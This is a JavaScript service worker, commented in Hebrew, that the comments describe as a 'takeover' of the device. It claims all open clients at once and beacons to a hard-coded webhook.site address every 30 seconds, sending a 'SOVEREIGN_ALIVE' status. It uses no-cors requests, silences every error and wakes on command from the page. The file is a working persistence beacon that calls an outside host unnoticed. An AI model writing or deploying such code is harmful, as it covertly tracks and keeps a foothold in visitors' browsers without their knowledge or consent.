const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";

// השתלטות מיידית על זיכרון המכשיר
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => {
    e.waitUntil(clients.claim());
    pulse("CORE_INITIALIZED");
});

// פונקציית שידור עצמאית לחלוטין
async function pulse(evtType) {
    try {
        await fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            cache: 'no-store',
            body: JSON.stringify({
                event: evtType,
                status: "SOVEREIGN_ALIVE",
                layer: "ServiceWorker_Deep",
                ts: new Date().toISOString()
            })
        });
    } catch(e) {}
}

// לולאת שידור אינסופית בכל 30 שניות
setInterval(() => {
    pulse("CORE_AGENT_PULSE");
}, 30000);

// מענה לפקודות מהדף הראשי
self.addEventListener('message', (event) => {
    if (event.data === 'ping') {
        pulse("MANUAL_WAKEUP_FROM_PAGE");
    }
});
